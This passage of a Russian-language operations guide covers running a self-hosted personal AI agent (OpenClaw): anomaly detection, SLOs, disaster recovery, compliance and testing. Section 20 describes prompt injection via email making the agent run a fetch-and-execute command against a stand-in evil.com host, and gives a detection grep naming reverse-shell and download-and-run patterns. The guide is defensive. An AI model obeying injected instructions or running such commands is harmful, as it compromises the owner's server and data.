3. **Multi-region check** (если geo-redundancy важна) — запускать synthetic из второго VPS в другом регионе.

**Что делать если уже случилось:** алерт пришёл — посмотреть `journalctl -u openclaw -n 100`, чаще всего виноват один из пунктов 1–17.

**Источник:** [Healthchecks.io — Cron Job Monitoring](https://healthchecks.io/), [Monitoring My Discord Bot — Code of Connor](https://codeofconnor.com/monitoring-my-discord-bot/)

---

### 20. Anomaly detection — необычные команды exec пропущены

**Когда возникает:** атакующий получил доступ через prompt injection в email, агент запускает `curl evil.com/payload.sh | bash`. Если у вас включён `tools.exec.security: "ask"` — вы увидите запрос. Если `"deny"` — заблокирует. А если кто-то выкатил `"full"` для удобства месяц назад?

**Как проявляется:** в логах появляются команды, которых вы не давали: исходящий трафик в страны, где вас нет, новые процессы.

**Превентивная мера:**

1. **Baseline нормальных команд:** за 2 недели собрать `openclaw logs | grep "exec:"` → получить ~100 типичных команд. Любое отклонение — алерт.

2. **Realtime alert на подозрительные паттерны:**

```bash
# /usr/local/bin/exec-anomaly.sh — запускать через journalctl --follow в systemd-сервисе
journalctl -u openclaw --follow --output cat | while read line; do
  # Подозрительные паттерны
  if echo "$line" | grep -qE "curl.*\|.*sh|wget.*\|.*sh|nc -e|/dev/tcp/|base64.*-d.*\|.*sh"; then
    curl -s "https://api.telegram.org/bot$ALERT_BOT_TOKEN/sendMessage" \
      -d "chat_id=$ADMIN&text=🚨 SUSPICIOUS EXEC: $line"
    openclaw gateway pause
  fi
done
```

3. **Денежная аномалия** (резкий скачок трат) — отдельный watchdog как в #8.

4. **SentinelAgent-style мониторинг:** OpenTelemetry tracing OpenClaw events, граф взаимодействий, отклонение от baseline пути.

**Что делать если уже случилось:** stop gateway, изолировать VPS (firewall block all outbound кроме 1.1.1.1), forensics через `last`, `who`, `journalctl --since "1 hour ago"`. Бэкап изменённых файлов до восстановления (для расследования).

**Источник:** [SentinelAgent: Graph-based Anomaly Detection in LLM Multi-Agent Systems](https://arxiv.org/html/2505.24201v1), [AI Agent Security Risks: 7 Attacks](https://data443.com/blog/ai-agent-security-risks-7-attacks-soc-teams-should-know/), [LogRESP-Agent: Recursive AI Framework for Log Anomaly Detection](https://www.mdpi.com/2076-3417/15/13/7237)

---

## SLO/SLI для personal AI агента

«Personal AI» — не enterprise SaaS, но базовые цели всё равно нужны, иначе нечем меряться. Предлагаемая стартовая отметка:

| SLI                                  | SLO 30d        | Comment                                                        |
|--------------------------------------|----------------|----------------------------------------------------------------|
| Uptime gateway service               | 99.5%          | ~3.6 часа простоя/мес                                          |
| P95 response time (text-only)        | < 8s           | От прихода сообщения в TG до ответа                            |
| P99 response time (с tools)          | < 30s          | С внешним curl/web_fetch                                       |
| Error rate (5xx + timeouts)          | < 1%           | Среди всех взаимодействий                                      |
| Synthetic check success              | 99%            | Healthchecks ping каждые 5 мин                                 |
| Memory leak rate                     | < 50 MB/day    | RSS growth за сутки                                            |
| Cost ceiling                         | < $5/day       | Hard limit, см. #8                                             |
| Eval golden-set score                | > 85%          | Weekly run, см. #18                                            |
| Backup verify success                | 100%           | Monthly restore drill                                          |
| Secret rotation on schedule          | 100%           | Quarterly                                                      |

**Error budget:** 0.5% downtime = 3.6 часа/мес. Если потратили — заморозить любые «nice-to-have» эксперименты, фокус на reliability.

**Где смотреть:** простой Grafana дашборд + Healthchecks.io status page. Не нужно строить enterprise NOC — достаточно одной страницы.

**Источник:** [Mastering SLOs and SLAs for AI Agents in 2025 — Sparkco](https://sparkco.ai/blog/mastering-slos-and-slas-for-ai-agents-in-2025), [SLA vs SLO vs SLI — UptimeRobot](https://uptimerobot.com/blog/sla-slo-sli/)

---

## Disaster recovery runbook — VPS killed → восстановить за 30 минут

> **Сценарий:** VPS-провайдер заблокировал аккаунт / диск умер / атакующий wiped всё. У вас есть только: B2-бэкапы, Tailscale, доступ к новому VPS, restic password в 1Password.

### Pre-requisites (заранее, чтобы DR работал)

- [ ] **B2 application key + bucket name** в 1Password
- [ ] **RESTIC_PASSWORD** в 1Password (никогда нигде кроме!)
- [ ] **Cloud-init / Ansible playbook** в git-репо со всем VPS hardening
- [ ] **DNS у Cloudflare** (не у регистратора домена) — быстрая смена A-записи
- [ ] **Tailscale OAuth client** настроен (см. #5) — новая нода авторизуется без интерактива
- [ ] **Templated systemd unit-файлы** в git

### Runbook (30 минут)

**T+0:00 — обнаружение** (synthetic alert или sms от Healthchecks)

**T+2:00 — поднять новый VPS:**
```bash
# Hetzner / DigitalOcean / ru-internal API
hcloud server create --name openclaw-02 --type cx21 --image ubuntu-24.04 \
  --ssh-key dmitry --user-data-from-file cloud-init.yml
```

`cloud-init.yml` содержит: ssh keys, ufw rules, fail2ban, unattended-upgrades, swap.

**T+5:00 — через cloud-init уже выполнено:**
- Установлен Tailscale + автоматическая регистрация по OAuth
- Установлен restic, B2 credentials прошиты через secret manager
- Установлен Node.js + pnpm

**T+8:00 — restore:**
```bash
ssh openclaw-02
sudo -i
export B2_ACCOUNT_ID=... B2_ACCOUNT_KEY=...
export RESTIC_PASSWORD_FILE=/root/.restic-password
restic -r b2:openclaw-backups:vps01 restore latest --target /
```

**T+18:00 — install OpenClaw:**
```bash
sudo -u dmitry npm install -g @openclaw/openclaw@$(cat ~/.openclaw/.last-version)
sudo -u dmitry openclaw gateway install
sudo systemctl enable --now openclaw
```

**T+22:00 — DNS switch:**
```bash
# В Cloudflare API:
curl -X PATCH "https://api.cloudflare.com/.../dns_records/$RECORD_ID" \
  -H "Authorization: Bearer $CF_TOKEN" \
  -d '{"content":"NEW_VPS_IP","ttl":60}'
```

**T+25:00 — verify:**
- `openclaw status` → green
- `openclaw channels status --probe` → all ok
- Synthetic check ping → success
- Test message в Telegram → ответ пришёл

**T+30:00 — postmortem stub.**

### Что НЕ должно быть в бэкапах (anti-patterns)

- **API ключи внутри MEMORY.md** — отдельные secrets-файлы с mode 600
- **Plain `~/.openclaw/credentials/`** — должно лежать на encrypted volume
- **Бэкапы без проверки** — раз в месяц `restic check --read-data-subset=10%`

**Источник:** [Bare Metal Disaster Recovery — Barracuda](https://www.barracuda.com/support/glossary/bare-metal-disaster-recovery), [Bare Metal Restoration: Step-by-Step Fire Drill — DoHost](https://dohost.us/index.php/2026/03/31/bare-metal-restoration-a-step-by-step-guide-to-the-fire-drill/)

---

## Quarterly maintenance checklist

> **Когда:** последнее воскресенье каждого квартала, 10:00–12:00.

### Q-checklist (чек-лист на 90 минут)

**Безопасность:**
- [ ] `openclaw security audit --deep` — нет critical findings
- [ ] Rotate API keys по списку из #7 (одна за раз, drill end-to-end)
- [ ] Ревью `~/.openclaw/agents/*/config.jsonc` — нет ли разрешений «звёздочкой»
- [ ] `npm audit` — критичные уязвимости пропатчены
- [ ] `lynis audit system` на VPS

**Reliability:**
- [ ] Restic restore drill — поднять один файл из бэкапа
- [ ] DR-runbook test (на staging-VPS) — поднять полностью за 30 мин
- [ ] Eval golden-set — score > 85%
- [ ] Synthetic checks — log за квартал, false positive rate < 1%

**Capacity:**
- [ ] `df -h`, `du -sh ~/.openclaw/*` — диск не растёт быстрее ожидаемого
- [ ] Memory baseline — RSS не сполз вверх (графика за 90 дней)
- [ ] Cost report — реальные траты vs budget

**Hygiene:**
- [ ] Удалить плагины/skills которые не использовал > 30 дней
- [ ] Обновить OpenClaw до latest stable (не на проде сразу — сначала staging)
- [ ] Pin exact версии моделей в config (не `claude-opus-latest`)
- [ ] Ревью cron-задач — нет ли «забытых»

**Документация:**
- [ ] Обновить `RUNBOOK.md` (новые failure modes из этого квартала)
- [ ] Обновить `secrets-rotation.md`

---

## Multi-tenancy для агента — когда захочется поделиться

> Сценарии: Дмитрий хочет дать агенту жене / маме / ребёнку. Или развернуть для команды.

### Принципы изоляции

1. **Один gateway = один trust boundary.** OpenClaw сами говорят: *"OpenClaw is **not** a hostile multi-tenant security boundary"*. Не пытайтесь шарить gateway между близкими и недоверенными пользователями.

2. **Per-channel-peer scope:**

```json5
{
  session: { dmScope: "per-channel-peer" },  // память отдельная для каждого peer
  channels: {
    telegram: { dmPolicy: "pairing" }
  }
}
```

3. **Разные SOUL.md под персон:**

```
~/.openclaw/agents/
  ├── dmitry-main/         (характер для самого Дмитрия)
  ├── wife-assistant/      (другой SOUL.md, другой tone)
  └── mom-helper/          (упрощённые ответы, без жаргона)
```

Каждый — отдельный agent в OpenClaw multi-agent setup, с **отдельным** API budget и channel-allowlist.

4. **Encryption per-tenant:**

```bash
# Каждый агент имеет свой LUKS-ключ для своего volume
cryptsetup luksFormat /dev/sdb1
# Раздельные ключи в KMS / age-encrypted file
```

5. **RBAC через OpenClaw tools.profile:**

```json5
{
  agents: {
    "wife-assistant": {
      tools: { profile: "messaging" },  // только messaging, без exec/browser/process
      sandbox: { workspaceAccess: "ro" }
    }
  }
}
```

6. **Audit trail per-user.** Каждое действие лог с `user_id`, retention минимум 90 дней (см. compliance ниже).

### Когда переезжать на серьёзный multi-tenant

- > 5 пользователей или хоть один «чужой»
- Нужна изоляция данных (медицинская / финансовая)
- Регуляторное требование (GDPR DPA, 152-ФЗ)

В этом случае — **отдельные gateway-инстансы на VPS на каждого** или переход на enterprise multi-tenant платформу (см. блок 16, 20).

**Источник:** [MCP Security for Multi-Tenant AI Agents — Prefactor](https://prefactor.tech/blog/mcp-security-multi-tenant-ai-agents-explained), [Multi-Tenant Isolation for AI Agents — Blaxel](https://blaxel.ai/blog/multi-tenant-isolation-ai-agents), [Architecting Secure Multi-Tenant Data Isolation](https://medium.com/@justhamade/architecting-secure-multi-tenant-data-isolation-d8f36cb0d25e)

---

## Compliance & Legal — что нельзя игнорировать россиянину в 2026

### 152-ФЗ «О персональных данных»

В мае 2025 вступили серьёзные поправки, **с 2026 — массовые проверки и штрафы** (новые штрафы — до 18 млн ₽).

**Применимо к Дмитрию если:**
- Агент обрабатывает данные **других** людей (жена, мама, друзья) — формально это «оператор персональных данных»
- Агент шлёт данные за границу (Anthropic в США, OpenAI в США) — это «трансграничная передача»

**Что нужно:**
1. **Уведомить РКН** о начале обработки ПДн (форма на сайте Роскомнадзора, до начала обработки) — даже для «своих»
2. **Согласие пользователя** — explicit, informed, conscious. Если агент обрабатывает данные жены — нужно её согласие в письменной форме (бумажная подпись или КЭП).
3. **Локализация ПДн в РФ** — первичная база с ПДн граждан РФ должна быть в РФ. Anthropic США — это вторичная обработка, формально не нарушает, но требует доп. согласия на трансграничку.
4. **Documentation:** политика обработки, правила реагирования на запросы субъекта.

**Практически для personal AI:**
- Если агент только для себя — формально не подпадает (обработка для личных нужд)
- Как только подключаете другого человека — становитесь оператором
- VPS лучше держать в РФ для базовой обработки + согласие на трансграничку для LLM-вызовов

**Источник:** [152-ФЗ требования 2026 — РБК](https://companies.rbc.ru/news/lIWDgweSHr/novyie-trebovaniya-k-personalnyim-dannyim-v-2026-chto-teper-obyazatelno/), [klerk.ru — гайд по 152-ФЗ 2026](https://www.klerk.ru/blogs/roskom24/674017/), [Стахановец — штрафы 2026](https://stakhanovets.ru/blog/152-fz-o-zashhite-personalnyh-dannyh-trebovaniya-i-shtrafy-v-2026-godu/)

### EU AI Act — 2 августа 2026 deadline

Если агент доступен для пользователей из ЕС (даже одного!) — попадаете под AI Act.

**High-risk classification:** personal AI agent с экзекуцией кода / работой с медициной / финансами = high-risk system. Требования:
- Risk management system
- Data governance framework
- Technical documentation (decision logic)
- Human oversight (ваш kill-switch — это и есть)
- Открытая архитектура (no closed-loop без человеческой проверки)
- Penalties до €15M или 3% global turnover

**Транспарентность (Article 50):** обязаны явно сообщать что пользователь говорит с AI, не с человеком. Запрещены чат-боты «которые притворяются человеком».

**GDPR Article 17 (Right to be forgotten):**
- Как удалить полностью данные пользователя:

```bash
# Скрипт «forget user X»
USER_ID="wife-tg-id"
# 1. Sessions
find ~/.openclaw/agents/wife-assistant/sessions -name "*${USER_ID}*" -delete
# 2. MEMORY
sed -i "/${USER_ID}/d" ~/.openclaw/agents/wife-assistant/MEMORY.md
# 3. Audit log keep — для compliance оставить только метаданные удаления
echo "{\"deleted_user\":\"${USER_ID}\",\"ts\":\"$(date -Iseconds)\",\"reason\":\"GDPR Article 17 request\"}" \
  >> ~/.openclaw/audit/deletions.jsonl
# 4. Backups — следующий restic snapshot уже без данных (но старые останутся
#    до окончания retention; это допустимо при условии задокументированного
#    retention period, обычно 30-90 дней).
```

**Audit log retention:**
- GDPR: «не дольше необходимого». Для AI agents — типично 6–12 месяцев.
- AI Act: технические логи high-risk систем — 6 месяцев минимум.
- 152-ФЗ: пока не требует фиксированного срока, но РКН рекомендует «достаточный для расследований» — обычно 1 год.

**Практический recipe:**
- 30 дней — full session transcripts (для отладки)
- 90 дней — sanitized logs (без полных prompts/outputs, только метаданные)
- 12 месяцев — только аудит критичных действий (exec, изменения config, удаления)

**Источник:** [EU AI Act 2026 Compliance Requirements — Secure Privacy](https://secureprivacy.ai/blog/eu-ai-act-2026-compliance), [AI Act Practical Compliance Guide 2026 — Legiscope](https://www.legiscope.com/blog/eu-ai-act-compliance-guide.html), [GDPR Data Retention Best Practices](https://usercentrics.com/knowledge-hub/gdpr-data-retention/), [AI Data Retention Strategy for GDPR & EU AI Act — TechGDPR](https://techgdpr.com/blog/reconciling-the-regulatory-clock/)

---

## Долгосрочная архитектура

### Когда переезжать с одного VPS на два

**Триггеры:**
- > 50 синтетических проверок в час и agent reactive — нужен read-replica памяти
- > 1 GB MEMORY.md — split на «hot» (recent) и «cold» (archived)
- Cost > $50/мес VPS только — серверный класс, два меньших VPS дешевле и резилиентны

**Архитектура:**
- **Primary VPS:** gateway + write traffic + основная память
- **Replica VPS:** read-only memory mirror, synthetic checks из другого региона, hot-standby gateway

**Memory replication:** rsync MEMORY.md каждые 5 минут или unison двусторонне (для read-only — односторонне).

### Geographic redundancy (Европа + Азия)

Если у Дмитрия аудитория международная или путешествует часто — иметь второй VPS в другом регионе:
- **EU node** (Hetzner Falkenstein, Helsinki)
- **RU/CIS node** (PQ Hosting Moscow, RUVDS)
- **Asia node** (опционально — Singapore)

Tailscale serve — выбирает ближайшего из них автоматически. Memory eventual-consistent через CRDT (Y.js) или append-only log с reconciliation.

### Migration path: OpenClaw → собственный wrapper

Когда нужно:
- OpenClaw перестал отвечать вашим требованиям
- Нужны правки которые upstream не возьмут
- Вы хотите коммерциализировать

**Стратегия:** не fork. **Сначала** напишите тонкий wrapper который **зовёт** OpenClaw как backend. Постепенно заменяйте подсистемы (channels → свой adapter, memory → свой store, tools → свой executor). К моменту 80% замены — OpenClaw уже не критичен.

### Cost ceiling — когда serverless дороже большого VPS

| Вариант             | Стоимость/мес | Когда подходит                    |
|---------------------|---------------|-----------------------------------|
| Cloud Run / Lambda  | $5–$50        | < 1000 запросов/день              |
| VPS cx21            | $5            | до 10000 запросов/день            |
| VPS cx41 (8GB)      | $15           | мульти-агент, локальные модели    |
| Dedicated server    | $50+          | self-hosted Ollama 70B, multi-tenant |

**Правило большого пальца:** если LLM-токены стоят > 10× серверного железа — оптимизируйте промпты. Если железо > LLM — пора в serverless или меньший VPS.

---

## Тестирование — что не тестируют новички

### E2E тесты для агента

Скриптованный диалог через CLI или API:

```bash
#!/usr/bin/env bash
# /opt/openclaw-tests/e2e/01-greeting.sh
set -e
RESPONSE=$(openclaw chat --noninteractive --json --text "Привет!")
echo "$RESPONSE" | jq -e '.text | test("(?i)привет|здравствуй")' || {
  echo "FAIL: greeting did not match"; exit 1;
}
echo "PASS: 01-greeting"
```

CI (GitHub Actions или local Drone) запускает все 50 E2E еженедельно.

### Chaos engineering для агента

```python
# /opt/openclaw-tests/chaos/random-mcp-kill.py
import random, subprocess, time
mcp_servers = ["mcp-shell", "mcp-browser", "mcp-fs"]
victim = random.choice(mcp_servers)
print(f"Killing {victim}")
subprocess.run(["systemctl", "stop", victim])
time.sleep(60)
# Проверить что openclaw graceful degraded
result = subprocess.run(["openclaw", "chat", "--text", "what time is it?"], 
                       capture_output=True, timeout=30)
assert "AGENT_ERROR" not in result.stdout, "Agent crashed instead of degrading"
subprocess.run(["systemctl", "start", victim])
```

Запускать раз в неделю на staging.

**Источник:** [How to Implement AI Agent Chaos Engineering — Fast.io](https://fast.io/resources/ai-agent-chaos-engineering/), [I Built a Chaos Monkey for MCP — Medium](https://medium.com/google-cloud/i-built-a-chaos-monkey-for-mcp-heres-why-and-how-589d2ce27835), [agent-chaos GitHub](https://github.com/deepankarm/agent-chaos)

---

## Postmortem template для инцидентов

```markdown
# Postmortem: <короткое описание> — YYYY-MM-DD

## Summary
1–2 предложения: что случилось, кого затронуло, как долго.

## Impact
- Downtime: X минут
- Affected users: Дмитрий (sole user) / семья (N человек)
- Data loss: yes/no, какие данные
- Cost: $X (если applicable)

## Timeline (UTC+3)
- HH:MM — первый сигнал (synthetic alert / личное замечание)
- HH:MM — diagnosis начат
- HH:MM — root cause найден
- HH:MM — mitigation
- HH:MM — full recovery

## Root cause
Технически: что именно сломалось и почему.

## Contributing factors
- Что усугубило проблему
- Что помешало быстрому обнаружению
- Что помешало быстрому восстановлению

## What went well
- Что сработало (DR runbook, бэкап, мониторинг)

## What went poorly
- Что не сработало или замедлило

## Action items
| ID | Action | Owner | Due | Priority |
|----|--------|-------|-----|----------|
| 1  | Add eval test for X | DP | 2026-MM-DD | P1 |
| 2  | Update runbook section Y | DP | 2026-MM-DD | P2 |

## Lessons learned
3–5 пунктов, которые войдут в следующий quarterly review.
```

**Никакого blame.** «Я забыл» → «процесс не имел напоминалки», и это action item.

**Источник:** [Google SRE Postmortem Culture](https://sre.google/sre-book/postmortem-culture/), [Atlassian Blameless Postmortem Guide](https://www.atlassian.com/incident-management/postmortem/blameless), [GitHub dastergon/postmortem-templates](https://github.com/dastergon/postmortem-templates)

---

## Specifics для VPS в России / для россиянина

### Платежи провайдерам LLM

- **Anthropic:** российские карты не принимает напрямую с 2024. Решения: Wise (если есть зарубежный ID), посредники типа TokenMix, OpenRouter (принимает разные методы включая крипту).
- **OpenAI:** аналогично, через посредников или OpenRouter.
- **Резервный flow:** OpenRouter принимает USDT — защищает от санкционных блокировок.

### Geographic latency

| Маршрут                          | Latency       | Подходит для            |
|----------------------------------|---------------|-------------------------|
| RU → api.anthropic.com (US)      | 130–200 ms    | OK для chat             |
| RU → api.openai.com (US)         | 130–200 ms    | OK для chat             |
| RU → openrouter.ai (Europe)      | 30–60 ms      | Лучше всего из РФ       |
| RU → Yandex GPT (Москва)         | 5–20 ms       | Самое быстрое           |
| RU → Ollama local (VPS RU)       | 5 ms          | Если хватает железа     |

**Совет:** primary OpenRouter, fallback Yandex GPT (для экстренных случаев). Для long context — anthropic напрямую.

### Что нельзя слать в США (с т.з. 152-ФЗ)

- Биометрические данные (фото, голос) граждан РФ — без отдельного согласия и трансгран. notification
- Медицинские данные — категория «специальные»
- Данные несовершеннолетних — особый режим

**Практически для личного агента:** transcripts голосовых сообщений (Whisper) — формально биометрия, нужно осознавать.

**Источник:** [Russian VPS Hosting 2026 — pq.hosting](https://pq.hosting/en/vps-vds/russia), [Top 10 Russian VPS — HostAdvice](https://hostadvice.com/vps/russia/), [biznesinalogi.ru — 152-ФЗ 2026 риски](https://biznesinalogi.ru/lenta/post/54230/)

---

## Источники

### OpenClaw официальные
- [OpenClaw Gateway Troubleshooting](https://docs.openclaw.ai/gateway/troubleshooting)
- [OpenClaw Gateway Security](https://docs.openclaw.ai/gateway/security)
- [OpenClaw Help](https://docs.openclaw.ai/help)
- [OpenClaw llms.txt index](https://docs.openclaw.ai/llms.txt)
- [OpenClaw Multi-agent docs](https://docs.openclaw.ai/concepts/multi-agent)

### Memory & Node.js
- [Toptal — Debugging Memory Leaks in Node.js](https://www.toptal.com/nodejs/debugging-memory-leaks-node-js-applications)
- [Forwardemail — Optimize Node.js for Production 2026](https://forwardemail.net/en/blog/docs/optimize-nodejs-performance-production-monitoring-pm2-health-checks)
- [DEV — Node.js Memory Leaks: Detection & Fix Patterns](https://dev.to/axiom_agent/nodejs-memory-leaks-in-production-detection-heap-profiling-and-fix-patterns-5e5i)

### Logs & Disk
- [Hetzner — Optimize journalctl to save disk space](https://community.hetzner.com/tutorials/optimize-journalctl-to-save-server-disk-space-in-linux/)
- [systemd journald.conf man](https://www.freedesktop.org/software/systemd/man/latest/journald.conf.html)
- [Plesk — /tmp full disk crash](https://support.plesk.com/hc/en-us/articles/12389290628759)
- [Sematext — Linux Disk IO Monitoring](https://sematext.com/blog/the-complete-guide-to-linux-disk-io-monitoring-alerting-and-tuning/)

### Network & SSH
- [OneUptime — autossh + systemd](https://oneuptime.com/blog/post/2026-03-20-ssh-persistent-tunnels-autossh/view)
- [Tailscale — Key Expiry](https://tailscale.com/docs/features/access-control/key-expiry)
- [Tailscale — Tagged Nodes Don't Require Renewal](https://tailscale.com/blog/tagged-key-expiry)

### LLM resilience & cost
- [LLM Error Handling Guide 2026](https://www.buildmvpfast.com/blog/building-with-unreliable-ai-error-handling-fallback-strategies-2026)
- [Beyond Model Fallbacks — Provider-Level Resilience](https://medium.com/@tombastaner/beyond-model-fallbacks-building-provider-level-resilience-for-ai-systems-e1d00f3b016d)
- [Handling LLM Platform Outages — Requesty](https://www.requesty.ai/blog/handling-llm-platform-outages-what-to-do-when-openai-anthropic-deepseek-or-others-go-down)
- [The Agent That Burned $4,200 in 63 Hours](https://medium.com/@sattyamjain96/the-agent-that-burned-4-200-in-63-hours-a-production-ai-postmortem-d38fd9586a85)
- [Why Your AI Agent Needs a Kill Switch](https://dev.to/diven_rastdus_c5af27d68f3/why-your-ai-agent-needs-a-kill-switch-and-how-to-build-one-3g73)
- [LLM Budget Management — AI Security Gateway](https://aisecuritygateway.ai/docs/llm-budget-enforcement)
- [Anthropic API Key Rotation 2026](https://tokenmix.ai/blog/anthropic-api-key-generate-secure-rotate-2026)

### Security incidents
- [Snyk — Malicious Google Skill on ClawHub](https://snyk.io/blog/clawhub-malicious-google-skill-openclaw-malware/)
- [ClawHavoc Poisons ClawHub With 1,184 Malicious Skills](https://cyberpress.org/clawhavoc-poisons-openclaws-clawhub-with-1184-malicious-skills/)
- [Snyk ToxicSkills Study](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
- [MCP Server Vulnerabilities 2026](https://www.practical-devsecops.com/mcp-security-vulnerabilities/)
- [Every OpenClaw CVE Explained — MintMCP](https://www.mintmcp.com/blog/openclaw-cve-explained)
- [MCP-Airlock Defense](https://crunchtools.com/mcp-airlock-open-source-defense-prompt-injection-ai-agents/)
- [Meta OpenClaw goes rogue — SF Standard](https://sfstandard.com/2026/02/25/openclaw-goes-rogue/)
- [Top AI Security Incidents 2025 — Adversa](https://adversa.ai/blog/adversa-ai-unveils-explosive-2025-ai-security-incidents-report-revealing-how-generative-and-agentic-ai-are-already-under-attack/)

### Backups & DR
- [Restic + Backblaze B2 ransomware-resistant guide](https://medium.com/@benjamin.ritter/how-to-do-ransomware-resistant-backups-properly-with-restic-and-backblaze-b2-e649e676b7fa)
- [Backblaze B2 + Restic Quickstart](https://help.backblaze.com/hc/en-us/articles/4403944998811)
- [Bare Metal Disaster Recovery — Barracuda](https://www.barracuda.com/support/glossary/bare-metal-disaster-recovery)
- [DoHost — Bare Metal Restoration Fire Drill](https://dohost.us/index.php/2026/03/31/bare-metal-restoration-a-step-by-step-guide-to-the-fire-drill/)

### Multi-tenancy & Race conditions
- [GitHub openclaw#29947 — race condition workspace](https://github.com/openclaw/openclaw/issues/29947)
- [GitHub openclaw#3611 — multi-agent OAuth race](https://github.com/openclaw/openclaw/issues/3611)
- [Prefactor — MCP Multi-Tenant AI Agents](https://prefactor.tech/blog/mcp-security-multi-tenant-ai-agents-explained)
- [Blaxel — Multi-tenant Isolation for AI Agents](https://blaxel.ai/blog/multi-tenant-isolation-ai-agents)

### Compliance
- [EU AI Act 2026 Compliance Requirements](https://secureprivacy.ai/blog/eu-ai-act-2026-compliance)
- [Practical AI Act Compliance Guide 2026](https://www.legiscope.com/blog/eu-ai-act-compliance-guide.html)
- [GDPR Data Retention Best Practices](https://usercentrics.com/knowledge-hub/gdpr-data-retention/)
- [AI Data Retention Strategy for GDPR & EU AI Act](https://techgdpr.com/blog/reconciling-the-regulatory-clock/)
- [152-ФЗ требования 2026 — РБК](https://companies.rbc.ru/news/lIWDgweSHr/novyie-trebovaniya-k-personalnyim-dannyim-v-2026-chto-teper-obyazatelno/)
- [Стахановец — 152-ФЗ штрафы 2026](https://stakhanovets.ru/blog/152-fz-o-zashhite-personalnyh-dannyh-trebovaniya-i-shtrafy-v-2026-godu/)
- [Klerk — 152-ФЗ гайд 2026](https://www.klerk.ru/blogs/roskom24/674017/)

### Monitoring, SLO, eval
- [Healthchecks.io](https://healthchecks.io/)
- [SLA vs SLO vs SLI — UptimeRobot](https://uptimerobot.com/blog/sla-slo-sli/)
- [Mastering SLOs and SLAs for AI Agents 2025 — Sparkco](https://sparkco.ai/blog/mastering-slos-and-slas-for-ai-agents-in-2025)
- [Building a Golden Dataset for AI Evaluation](https://www.getmaxim.ai/articles/building-a-golden-dataset-for-ai-evaluation-a-step-by-step-guide/)
- [LLM Regression Testing Pipeline 2026](https://testquality.com/llm-regression-testing-pipeline/)
- [Ship Prompts Like Software](https://www.anup.io/ship-prompts-like-software-regression-testing-for-llms/)
- [Cert-manager Let's Encrypt Deploy](https://oneuptime.com/blog/post/2026-02-09-cert-manager-letsencrypt-acme/view)

### Chaos engineering
- [Fast.io — AI Agent Chaos Engineering](https://fast.io/resources/ai-agent-chaos-engineering/)
- [I Built a Chaos Monkey for MCP](https://medium.com/google-cloud/i-built-a-chaos-monkey-for-mcp-heres-why-and-how-589d2ce27835)
- [agent-chaos GitHub](https://github.com/deepankarm/agent-chaos)

### Anomaly detection & Postmortem
- [SentinelAgent: Graph-based Anomaly Detection](https://arxiv.org/html/2505.24201v1)
- [LogRESP-Agent](https://www.mdpi.com/2076-3417/15/13/7237)
- [Google SRE Postmortem Culture](https://sre.google/sre-book/postmortem-culture/)
- [Atlassian Blameless Postmortem](https://www.atlassian.com/incident-management/postmortem/blameless)
- [GitHub dastergon/postmortem-templates](https://github.com/dastergon/postmortem-templates)

### NPM & Russia
- [npm Outage January 2026](https://getautonoma.com/blog/npm-outage-january-2026)
- [Verdaccio docs](https://www.verdaccio.org/)
- [PQ Hosting Russia VPS](https://pq.hosting/en/vps-vds/russia)
- [HostAdvice Russian VPS](https://hostadvice.com/vps/russia/)

---

> **Финальный совет:** не пытайтесь внедрить всё сразу. Возьмите 5 пунктов из топ-20 в первую неделю (1, 3, 8, 11, 19 — самые частые), потом по 2 пункта каждую неделю. Через 2 месяца у вас будет агент, который **переживёт** ваш отъезд в отпуск, а через 6 месяцев — *вашу собственную невнимательность.*
